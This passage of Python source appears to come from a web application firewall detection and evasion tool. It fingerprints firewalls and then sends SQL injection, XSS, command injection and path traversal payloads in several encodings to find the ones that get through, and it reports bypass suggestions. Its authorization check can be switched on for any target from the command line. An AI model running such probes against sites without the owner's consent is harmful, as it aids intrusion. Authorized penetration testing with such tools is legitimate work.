                    if response_code in signature.status_codes:
                        confidence += 0.3
                        evidence.append(f"Status code: {response_code}")

                    # Check body patterns
                    for pattern in signature.body_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            confidence += 0.4
                            match = re.search(pattern, response_text, re.IGNORECASE)
                            evidence.append(f"Body pattern: {match.group()[:50]}")
                            break

                    # Check headers again
                    for header_name, pattern in signature.header_patterns:
                        header_value = headers.get(header_name) or headers.get(header_name.lower())
                        if header_value and re.search(pattern, header_value, re.IGNORECASE):
                            confidence += 0.2
                            evidence.append(f"Header on block: {header_name}")

                    if confidence > best_confidence:
                        best_match = signature.waf_type
                        best_confidence = confidence
                        best_evidence = evidence

            except Exception as e:
                logger.debug(f"[WAF-CHECK] Active detection error with payload: {e}")

        return best_match, best_confidence, best_evidence, response_code

    # ==========================================================================
    # PHASE 3: EVASION CONFIRMATION
    # ==========================================================================

    def _detect_evasion(self, url: str, detected_waf: WAFType) -> Tuple[float, List[str]]:
        """
        Confirm WAF detection by testing evasion techniques

        Returns:
            Tuple of (confidence_modifier, evidence)
        """
        evasion_payloads = [
            # Original
            ("' OR '1'='1", EncodingType.NONE),
            # Encoded versions
            ("' OR '1'='1", EncodingType.URL),
            ("' OR '1'='1", EncodingType.DOUBLE_URL),
            ("' OR '1'='1", EncodingType.UNICODE),
        ]

        blocked_count = 0
        passed_count = 0
        evidence = []

        for payload, encoding in evasion_payloads:
            try:
                self.rate_limiter.wait_sync()

                encoded = EncodingUtils.encode(payload, encoding)
                test_url = f"{url}?test={encoded}"

                response = self._session.get(
                    test_url,
                    headers=self._get_headers(),
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                )

                if response.status_code in [403, 406, 429, 500, 503]:
                    blocked_count += 1
                    evidence.append(f"Blocked: {encoding.value} encoding -> {response.status_code}")
                elif response.status_code == 200:
                    passed_count += 1
                    evidence.append(f"Passed: {encoding.value} encoding -> {response.status_code}")

            except Exception as e:
                logger.debug(f"[WAF-CHECK] Evasion test error: {e}")

        # Calculate confidence modifier based on blocking consistency
        if blocked_count > 0 and passed_count == 0:
            return 0.2, evidence  # Very consistent blocking
        elif blocked_count > passed_count:
            return 0.1, evidence  # Mostly blocking
        elif passed_count > 0:
            return -0.1, evidence  # Some evasion possible
        return 0.0, evidence

    # ==========================================================================
    # PUBLIC API: check_waf
    # ==========================================================================

    def check_waf(self, url: str) -> WAFDetectionResult:
        """
        Detect WAF type protecting a URL

        Three-phase detection:
        1. Passive: Check headers and cookies
        2. Active: Send trigger payloads
        3. Evasion: Confirm with encoded payloads

        Args:
            url: Target URL to check

        Returns:
            WAFDetectionResult with detection details

        Raises:
            PermissionError: If target is not authorized
        """
        self.auth_checker.require_authorization(url)

        logger.info(f"[WAF-CHECK] Starting WAF detection for: {url}")

        # Phase 1: Passive detection
        waf_type, confidence, evidence, headers = self._detect_passive(url)
        detection_phase = "passive"

        if waf_type and confidence >= 0.5:
            logger.info(f"[WAF-CHECK] Phase 1 (Passive): Detected {waf_type.value} with {confidence:.0%} confidence")
        else:
            # Phase 2: Active detection
            active_waf, active_conf, active_evidence, response_code = self._detect_active(url)

            if active_waf and active_conf > confidence:
                waf_type = active_waf
                confidence = active_conf
                evidence.extend(active_evidence)
                detection_phase = "active"
                logger.info(f"[WAF-CHECK] Phase 2 (Active): Detected {waf_type.value} with {confidence:.0%} confidence")

        # Phase 3: Evasion confirmation (if WAF detected)
        if waf_type and confidence >= 0.3:
            conf_mod, evasion_evidence = self._detect_evasion(url, waf_type)
            confidence = min(1.0, confidence + conf_mod)
            evidence.extend(evasion_evidence)
            if conf_mod != 0:
                detection_phase = "evasion"
                logger.info(f"[WAF-CHECK] Phase 3 (Evasion): Adjusted confidence to {confidence:.0%}")

        # Build result
        result = WAFDetectionResult(
            detected=waf_type is not None and waf_type != WAFType.NONE,
            waf_type=waf_type or WAFType.NONE,
            confidence=confidence,
            detection_phase=detection_phase,
            evidence=evidence,
            headers_found=headers,
            response_code=response_code if detection_phase == "active" else 0,
        )

        self._detection_results[url] = result

        if result.detected:
            logger.info(f"[WAF-CHECK] Result: {result.waf_type.value} detected with {result.confidence:.0%} confidence")
        else:
            logger.info("[WAF-CHECK] Result: No WAF detected")

        return result

    # ==========================================================================
    # PUBLIC API: test_payloads
    # ==========================================================================

    def test_payloads(
        self,
        url: str,
        categories: List[PayloadCategory] = None,
        encodings: List[EncodingType] = None,
        max_payloads: int = 50,
    ) -> List[PayloadTestResult]:
        """
        Test attack payloads against the target

        Args:
            url: Target URL
            categories: Payload categories to test (default: all)
            encodings: Encoding types to use (default: NONE, URL, DOUBLE_URL)
            max_payloads: Maximum number of payloads to test

        Returns:
            List of PayloadTestResult

        Raises:
            PermissionError: If target is not authorized
        """
        self.auth_checker.require_authorization(url)

        if categories is None:
            categories = [PayloadCategory.SQL_INJECTION, PayloadCategory.XSS,
                         PayloadCategory.COMMAND_INJECTION, PayloadCategory.PATH_TRAVERSAL]

        if encodings is None:
            encodings = [EncodingType.NONE, EncodingType.URL, EncodingType.DOUBLE_URL]

        logger.info(f"[WAF-CHECK] Testing payloads for: {url}")

        # Build payload list
        payloads = []
        for category in categories:
            if category == PayloadCategory.SQL_INJECTION:
                payloads.extend([(p, category) for p in PayloadDatabase.SQL_INJECTION])
            elif category == PayloadCategory.XSS:
                payloads.extend([(p, category) for p in PayloadDatabase.XSS])
            elif category == PayloadCategory.COMMAND_INJECTION:
                payloads.extend([(p, category) for p in PayloadDatabase.COMMAND_INJECTION])
            elif category == PayloadCategory.PATH_TRAVERSAL:
                payloads.extend([(p, category) for p in PayloadDatabase.PATH_TRAVERSAL])

        # Limit payloads
        if len(payloads) > max_payloads:
            payloads = random.sample(payloads, max_payloads)

        results = []

        for payload, category in payloads:
            for encoding in encodings:
                try:
                    result = self._test_single_payload(url, payload, category, encoding)
                    results.append(result)
                except Exception as e:
                    logger.debug(f"[WAF-CHECK] Payload test error: {e}")

        self._payload_results[url] = results

        # Summary
        blocked = sum(1 for r in results if r.blocked_by_waf)
        passed = sum(1 for r in results if r.status == BlockStatus.PASSED)
        logger.info(f"[WAF-CHECK] Payload testing complete: {blocked} blocked, {passed} passed")

        return results

    def _test_single_payload(
        self,
        url: str,
        payload: str,
        category: PayloadCategory,
        encoding: EncodingType,
    ) -> PayloadTestResult:
        """Test a single payload"""
        self.rate_limiter.wait_sync()

        encoded_payload = EncodingUtils.encode(payload, encoding)
        test_url = f"{url}?test={urllib.parse.quote(encoded_payload)}"

        start_time = time.time()

        try:
            response = self._session.get(
                test_url,
                headers=self._get_headers(),
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False,
            )

            response_time = time.time() - start_time
            response_code = response.status_code

            # Determine if blocked
            blocked_by_waf = response_code in [403, 406, 429, 500, 503]

            # Check response body for block indicators
            if not blocked_by_waf:
                body_lower = response.text.lower()
                block_indicators = [
                    "blocked", "denied", "forbidden", "rejected",
                    "firewall", "waf", "security", "not allowed",
                ]
                for indicator in block_indicators:
                    if indicator in body_lower:
                        blocked_by_waf = True
                        break

            status = BlockStatus.BLOCKED if blocked_by_waf else BlockStatus.PASSED

            return PayloadTestResult(
                payload=payload,
                category=category,
                encoding=encoding,
                status=status,
                response_code=response_code,
                response_time=response_time,
                blocked_by_waf=blocked_by_waf,
                evidence=f"Status: {response_code}",
                bypass_possible=not blocked_by_waf,
            )

        except Exception as e:
            return PayloadTestResult(
                payload=payload,
                category=category,
                encoding=encoding,
                status=BlockStatus.ERROR,
                response_code=0,
                response_time=time.time() - start_time,
                blocked_by_waf=False,
                evidence=str(e),
                bypass_possible=False,
            )

    # ==========================================================================
    # PUBLIC API: get_bypass_suggestions
    # ==========================================================================

    def get_bypass_suggestions(self, waf_type: WAFType) -> List[BypassSuggestion]:
        """
        Get bypass technique suggestions for a specific WAF type

        Args:
            waf_type: The WAF type to get suggestions for

        Returns:
            List of BypassSuggestion applicable to the WAF
        """
        suggestions = []

        for technique in BYPASS_TECHNIQUES:
            if waf_type in technique.applicable_to or waf_type == WAFType.UNKNOWN:
                suggestions.append(technique)

        # Sort by success rate
        suggestions.sort(key=lambda x: x.success_rate, reverse=True)

        logger.info(f"[WAF-CHECK] Found {len(suggestions)} bypass suggestions for {waf_type.value}")

        return suggestions

    # ==========================================================================
    # ASYNC SUPPORT
    # ==========================================================================

    async def _get_async_session(self) -> aiohttp.ClientSession:
        """Get or create async session"""
        if self._async_session is None or self._async_session.closed:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
            self._async_session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
            )
        return self._async_session

    async def check_waf_async(self, url: str) -> WAFDetectionResult:
        """Async version of check_waf"""
        self.auth_checker.require_authorization(url)

        session = await self._get_async_session()

        logger.info(f"[WAF-CHECK] Starting async WAF detection for: {url}")

        # Phase 1: Passive detection (async)
        waf_type = None
        confidence = 0.0
        evidence = []
        headers = {}
        detection_phase = "passive"

        try:
            await self.rate_limiter.wait_async()
            async with session.get(url, headers=self._get_headers()) as response:
                headers = dict(response.headers)

                for signature in WAF_SIGNATURES:
                    matches = 0

                    for header_name, pattern in signature.header_patterns:
                        if header_name.lower() in [h.lower() for h in headers]:
                            header_value = headers.get(header_name) or headers.get(header_name.lower())
                            if header_value and re.search(pattern, header_value, re.IGNORECASE):
                                matches += 1
                                evidence.append(f"Header {header_name}: {header_value}")

                    for header in signature.specific_headers:
                        if header.lower() in [h.lower() for h in headers]:
                            matches += 0.5
                            evidence.append(f"Specific header found: {header}")

                    if matches > 0:
                        total_checks = len(signature.header_patterns) + len(signature.specific_headers)
                        confidence = min(1.0, matches / max(total_checks, 1))
                        if confidence >= 0.3:
                            waf_type = signature.waf_type
                            break

        except Exception as e:
            logger.debug(f"[WAF-CHECK] Async passive detection error: {e}")

        # Phase 2: Active detection (async)
        if not waf_type or confidence < 0.5:
            trigger_payload = "' OR '1'='1"
            encoded_payload = urllib.parse.quote(trigger_payload)
            test_url = f"{url}?test={encoded_payload}"

            try:
                await self.rate_limiter.wait_async()
                async with session.get(test_url, headers=self._get_headers()) as response:
                    response_code = response.status
                    response_text = await response.text()

                    for signature in WAF_SIGNATURES:
                        active_confidence = 0.0

                        if response_code in signature.status_codes:
                            active_confidence += 0.3
                            evidence.append(f"Status code: {response_code}")

                        for pattern in signature.body_patterns:
                            if re.search(pattern, response_text, re.IGNORECASE):
                                active_confidence += 0.4
                                evidence.append(f"Body pattern matched")
                                break

                        if active_confidence > confidence:
                            waf_type = signature.waf_type
                            confidence = active_confidence
                            detection_phase = "active"

            except Exception as e:
                logger.debug(f"[WAF-CHECK] Async active detection error: {e}")

        result = WAFDetectionResult(
            detected=waf_type is not None and waf_type != WAFType.NONE,
            waf_type=waf_type or WAFType.NONE,
            confidence=confidence,
            detection_phase=detection_phase,
            evidence=evidence,
            headers_found=headers,
        )

        self._detection_results[url] = result
        return result

    async def test_payloads_async(
        self,
        url: str,
        categories: List[PayloadCategory] = None,
        encodings: List[EncodingType] = None,
        max_payloads: int = 50,
        concurrency: int = 10,
    ) -> List[PayloadTestResult]:
        """Async version of test_payloads with concurrent testing"""
        self.auth_checker.require_authorization(url)

        if categories is None:
            categories = [PayloadCategory.SQL_INJECTION, PayloadCategory.XSS]

        if encodings is None:
            encodings = [EncodingType.NONE, EncodingType.URL]

        session = await self._get_async_session()

        # Build payload list
        payloads = []
        for category in categories:
            if category == PayloadCategory.SQL_INJECTION:
                payloads.extend([(p, category) for p in PayloadDatabase.SQL_INJECTION])
            elif category == PayloadCategory.XSS:
                payloads.extend([(p, category) for p in PayloadDatabase.XSS])
            elif category == PayloadCategory.COMMAND_INJECTION:
                payloads.extend([(p, category) for p in PayloadDatabase.COMMAND_INJECTION])
            elif category == PayloadCategory.PATH_TRAVERSAL:
                payloads.extend([(p, category) for p in PayloadDatabase.PATH_TRAVERSAL])

        if len(payloads) > max_payloads:
            payloads = random.sample(payloads, max_payloads)

        # Build test tasks
        async def test_payload_async(payload: str, category: PayloadCategory, encoding: EncodingType):
            await self.rate_limiter.wait_async()

            encoded_payload = EncodingUtils.encode(payload, encoding)
            test_url = f"{url}?test={urllib.parse.quote(encoded_payload)}"

            start_time = time.time()

            try:
                async with session.get(test_url, headers=self._get_headers()) as response:
                    response_time = time.time() - start_time
                    response_code = response.status

                    blocked_by_waf = response_code in [403, 406, 429, 500, 503]

                    if not blocked_by_waf:
                        body = await response.text()
                        body_lower = body.lower()
                        block_indicators = ["blocked", "denied", "forbidden", "firewall"]
                        for indicator in block_indicators:
                            if indicator in body_lower:
                                blocked_by_waf = True
                                break

                    return PayloadTestResult(
                        payload=payload,
                        category=category,
                        encoding=encoding,
                        status=BlockStatus.BLOCKED if blocked_by_waf else BlockStatus.PASSED,
                        response_code=response_code,
                        response_time=response_time,
                        blocked_by_waf=blocked_by_waf,
                        bypass_possible=not blocked_by_waf,
                    )

            except Exception as e:
                return PayloadTestResult(
                    payload=payload,
                    category=category,
                    encoding=encoding,
                    status=BlockStatus.ERROR,
                    response_code=0,
                    response_time=time.time() - start_time,
                    blocked_by_waf=False,
                    evidence=str(e),
                )

        # Run with semaphore for concurrency control
        semaphore = asyncio.Semaphore(concurrency)

        async def limited_test(payload, category, encoding):
            async with semaphore:
                return await test_payload_async(payload, category, encoding)

        tasks = []
        for payload, category in payloads:
            for encoding in encodings:
                tasks.append(limited_test(payload, category, encoding))

        results = await asyncio.gather(*tasks)

        self._payload_results[url] = list(results)
        return list(results)

    async def close_async(self):
        """Close async session"""
        if self._async_session and not self._async_session.closed:
            await self._async_session.close()

    # ==========================================================================
    # UTILITY METHODS
    # ==========================================================================

    def get_detection_result(self, url: str) -> Optional[WAFDetectionResult]:
        """Get cached detection result for a URL"""
        return self._detection_results.get(url)

    def get_payload_results(self, url: str) -> List[PayloadTestResult]:
        """Get cached payload test results for a URL"""
        return self._payload_results.get(url, [])

    def export_results(self, url: str) -> Dict[str, Any]:
        """Export all results for a URL as JSON-serializable dict"""
        detection = self._detection_results.get(url)
        payloads = self._payload_results.get(url, [])

        return {
            "url": url,
            "detection": detection.to_dict() if detection else None,
            "payload_tests": [p.to_dict() for p in payloads],
            "bypass_suggestions": (
                [s.to_dict() for s in self.get_bypass_suggestions(detection.waf_type)]
                if detection and detection.detected else []
            ),
        }

    def add_authorized_target(self, target: str):
        """Add a target to authorized list"""
        self.auth_checker.add_authorized_target(target)

    def remove_authorized_target(self, target: str):
        """Remove a target from authorized list"""
        self.auth_checker.remove_authorized_target(target)


# ==============================================================================
# MODULE-LEVEL CONVENIENCE FUNCTIONS
# ==============================================================================

_waf_checker: Optional[WAFChecker] = None


def get_waf_checker(authorized_targets: List[str] = None) -> WAFChecker:
    """Get or create singleton WAFChecker instance"""
    global _waf_checker
    if _waf_checker is None:
        _waf_checker = WAFChecker(authorized_targets=authorized_targets)
    elif authorized_targets:
        for target in authorized_targets:
            _waf_checker.add_authorized_target(target)
    return _waf_checker


def check_waf(url: str, authorized_targets: List[str] = None) -> WAFDetectionResult:
    """
    Convenience function to detect WAF type

    Args:
        url: Target URL to check
        authorized_targets: List of authorized target domains

    Returns:
        WAFDetectionResult
    """
    checker = get_waf_checker(authorized_targets)
    return checker.check_waf(url)


def test_payloads(
    url: str,
    categories: List[PayloadCategory] = None,
    authorized_targets: List[str] = None,
) -> List[PayloadTestResult]:
    """
    Convenience function to test payloads

    Args:
        url: Target URL
        categories: Payload categories to test
        authorized_targets: List of authorized target domains

    Returns:
        List of PayloadTestResult
    """
    checker = get_waf_checker(authorized_targets)
    return checker.test_payloads(url, categories=categories)


def get_bypass_suggestions(waf_type: WAFType) -> List[BypassSuggestion]:
    """
    Convenience function to get bypass suggestions

    Args:
        waf_type: WAF type to get suggestions for

    Returns:
        List of BypassSuggestion
    """
    checker = get_waf_checker()
    return checker.get_bypass_suggestions(waf_type)


# ==============================================================================
# CLI INTERFACE
# ==============================================================================

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="TSUNAMI WAF Checker v5.0")
    parser.add_argument("url", help="Target URL to check")
    parser.add_argument("--authorize", action="store_true",
                       help="Authorize the target for testing")
    parser.add_argument("--detect", action="store_true",
                       help="Detect WAF type")
    parser.add_argument("--test-payloads", action="store_true",
                       help="Test attack payloads")
    parser.add_argument("--category", type=str, nargs="+",
                       choices=["sql", "xss", "cmd", "path"],
                       help="Payload categories to test")
    parser.add_argument("--json", action="store_true",
                       help="Output as JSON")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Map category names
    category_map = {
        "sql": PayloadCategory.SQL_INJECTION,
        "xss": PayloadCategory.XSS,
        "cmd": PayloadCategory.COMMAND_INJECTION,
        "path": PayloadCategory.PATH_TRAVERSAL,
    }

    categories = None
    if args.category:
        categories = [category_map[c] for c in args.category]

    try:
        checker = WAFChecker()

        if args.authorize:
            checker.add_authorized_target(args.url)
            print(f"[+] Authorized target: {args.url}")

        if args.detect or not args.test_payloads:
            result = checker.check_waf(args.url)

            if args.json:
                print(json.dumps(result.to_dict(), indent=2))
            else:
                print(f"\n[WAF Detection Results]")
                print(f"  Detected: {result.detected}")
                print(f"  WAF Type: {result.waf_type.value}")
                print(f"  Confidence: {result.confidence:.0%}")
                print(f"  Phase: {result.detection_phase}")
                if result.evidence:
                    print(f"  Evidence:")
                    for e in result.evidence[:5]:
                        print(f"    - {e}")

                if result.detected:
                    suggestions = checker.get_bypass_suggestions(result.waf_type)
                    if suggestions:
                        print(f"\n[Bypass Suggestions]")
                        for s in suggestions[:3]:
                            print(f"  - {s.technique} (success rate: {s.success_rate:.0%})")

        if args.test_payloads:
            results = checker.test_payloads(args.url, categories=categories)

            if args.json:
                print(json.dumps([r.to_dict() for r in results], indent=2))
            else:
                blocked = sum(1 for r in results if r.blocked_by_waf)
                passed = sum(1 for r in results if r.status == BlockStatus.PASSED)
                print(f"\n[Payload Test Results]")
                print(f"  Total: {len(results)}")
                print(f"  Blocked: {blocked}")
                print(f"  Passed: {passed}")

                if passed > 0:
                    print(f"\n[Payloads that passed]")
                    for r in results:
                        if r.status == BlockStatus.PASSED:
                            print(f"  - [{r.category.value}] {r.payload[:50]}... ({r.encoding.value})")

    except PermissionError as e:
        print(f"[!] Authorization Error: {e}")
        print(f"[!] Use --authorize flag to authorize the target")
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
